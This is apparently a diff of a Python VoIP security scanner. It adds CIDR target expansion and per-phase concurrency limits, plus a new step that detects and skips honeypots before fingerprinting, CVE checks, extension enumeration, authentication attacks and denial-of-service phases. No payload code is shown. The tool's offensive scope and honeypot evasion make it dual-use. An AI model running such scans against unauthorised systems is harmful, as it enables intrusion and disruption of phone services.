@@ -2812,18 +3464,44 @@ function ft(){{
     Con.ok(f"HTML report: {rd}/voip_report.html")
 
 # ══════════════════════════════════════════════════════════
-# LOAD TARGETS
+# LOAD TARGETS  (supports CIDR notation)
 # ══════════════════════════════════════════════════════════
 def load_targets(path:str) -> List[str]:
-    out = []
+    out: List[str] = []
+    seen: Set[str] = set()
+
+    def _add(ip: str):
+        if ip not in seen:
+            seen.add(ip)
+            out.append(ip)
+
     try:
         with open(path,encoding="utf-8",errors="replace") as f:
             for line in f:
-                line=line.strip()
-                if line and not line.startswith("#"):
-                    if (re.match(r'^\d{1,3}(\.\d{1,3}){3}(/\d+)?$',line) or
-                        re.match(r'^[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}$',line)):
-                        out.append(line)
+                line = line.strip()
+                if not line or line.startswith("#"):
+                    continue
+                # CIDR notation (e.g., 192.168.1.0/24)
+                if "/" in line:
+                    try:
+                        net = ipaddress.ip_network(line, strict=False)
+                        # Skip huge networks to avoid memory issues
+                        if net.num_addresses <= 65536:
+                            for addr in net.hosts():
+                                _add(str(addr))
+                        else:
+                            Con.warn(f"Skipping large CIDR {line} "
+                                     f"({net.num_addresses} addresses — use /16 or smaller)")
+                    except ValueError:
+                        pass
+                    continue
+                # Plain IP
+                if re.match(r'^\d{1,3}(\.\d{1,3}){3}$', line):
+                    _add(line)
+                    continue
+                # Hostname
+                if re.match(r'^[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}$', line):
+                    _add(line)
         Con.ok(f"Loaded {col(str(len(out)),'white')} targets from {path}")
     except FileNotFoundError:
         Con.err(f"Target file not found: {path}")
@@ -2852,41 +3530,54 @@ async def run(input_file:str, cdr_file:str):
 
     targets = load_targets(input_file)
     state   = State()
-    sem     = asyncio.Semaphore(THREADS)
-    sess    = new_session()
+
+    # Phase-specific semaphores for optimal concurrency tuning
+    sem_disc = asyncio.Semaphore(SEM_DISCOVERY)
+    sem_fp   = asyncio.Semaphore(SEM_FINGERPRINT)
+    sem_cve  = asyncio.Semaphore(SEM_CVE)
+    sem_sip  = asyncio.Semaphore(SEM_SIP)
+    sem_ext  = asyncio.Semaphore(SEM_EXTENSION)
+    sem_rtp  = asyncio.Semaphore(SEM_RTP)
+    sem_stun = asyncio.Semaphore(SEM_STUN)
+    sem_iax  = asyncio.Semaphore(SEM_IAX2)
+    sem_leg  = asyncio.Semaphore(SEM_LEGACY)
+    sem_tftp = asyncio.Semaphore(SEM_TFTP)
+    sem_auth = asyncio.Semaphore(SEM_AUTH)
+    sem_dos  = asyncio.Semaphore(SEM_DOS)
+    sem_mgmt = asyncio.Semaphore(SEM_MGMT)
+    sem_vend = asyncio.Semaphore(SEM_VENDOR)
+
+    sess = new_session()
 
     try:
-        # ── Async phases ─────────────────────────────────
-        await phase1_discovery(targets, state, sem)
-        await phase2_fingerprint(state, sess, sem)
-        await phase3_cve(state, sess, sem)
-        await phase4_sip(state, sem)
-        await phase5_extensions(state, sem)
-        await phase6_rtp(state, sem)
-        await phase7_stun_turn(state, sem)
-        await phase8_iax2(state, sem)
-        await phase9_mgcp_sccp_h323(state, sem)
-        await phase10_tftp(state, sem)
-        await phase11_auth(state, sess, sem)
-        await phase12_dos(state, sem)
-        await phase13_snmp_mgmt(state, sess, sem)
-        await phase14_vendor(state, sess, sem)
+        await phase1_discovery(targets, state, sem_disc)
+        await phase1b_honeypot(state, sem_fp)
+        await phase2_fingerprint(state, sess, sem_fp)
+        await phase3_cve(state, sess, sem_cve)
+        await phase4_sip(state, sem_sip)
+        await phase5_extensions(state, sem_ext)
+        await phase6_rtp(state, sem_rtp)
+        await phase7_stun_turn(state, sem_stun)
+        await phase8_iax2(state, sem_iax)
+        await phase9_mgcp_sccp_h323(state, sem_leg)
+        await phase10_tftp(state, sem_tftp)
+        await phase11_auth(state, sess, sem_auth)
+        await phase12_dos(state, sem_dos)
+        await phase13_snmp_mgmt(state, sess, sem_mgmt)
+        await phase14_vendor(state, sess, sem_vend)
     finally:
         if sess and HAS_AIOHTTP:
             await sess.close()
 
-    # ── Sync phases ───────────────────────────────────────
     phase15_cdr(cdr_file, RESULTS_DIR)
     phase16_report(state, input_file, RESULTS_DIR)
-
-    # ── Persist results ───────────────────────────────────
     state.save(RESULTS_DIR)
 
-    # ── Final summary banner ──────────────────────────────
     elapsed = time.monotonic()-state.scan_start
     Con.phase("ASSESSMENT COMPLETE")
     Con.stat_line("Total elapsed",     f"{elapsed:.0f}s")
     Con.stat_line("Live hosts",        len(state.live_ips))
+    Con.stat_line("Honeypots excluded",len(state.honeypot_ips))
     Con.stat_line("Total findings",    len(state.cve_findings))
     Con.stat_line("CRITICAL",          col(str(state.stats.get("CRITICAL",0)),"red"))
     Con.stat_line("HIGH",              col(str(state.stats.get("HIGH",0)),"orange"))
@@ -2903,6 +3594,7 @@ async def run(input_file:str, cdr_file:str):
         try: _log_file_handle.close()
         except: pass
 
+
 def main():
     input_file = (sys.argv[1] if len(sys.argv)>=2 and sys.argv[1]
                   else ("targets.txt" if Path("targets.txt").exists() else "targets.txt"))
@@ -2914,6 +3606,7 @@ def main():
     signal.signal(signal.SIGINT,_sig)
 
     asyncio.run(run(input_file, cdr_file))
+
 
 if __name__=="__main__":
     main()
